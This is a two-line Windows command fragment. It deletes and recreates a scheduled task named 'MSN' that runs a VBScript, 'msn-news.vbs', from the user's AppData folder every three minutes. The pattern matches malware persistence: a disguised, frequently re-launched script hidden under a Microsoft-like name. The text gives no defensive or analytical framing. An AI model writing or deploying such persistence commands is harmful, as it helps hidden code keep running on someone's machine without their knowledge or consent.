schtasks /delete /tn "MSN" /f
schtasks /create /sc minute /mo 3 /tn "MSN" /tr "%APPDATA%\Microsoft\Windows\msn-news.vbs"
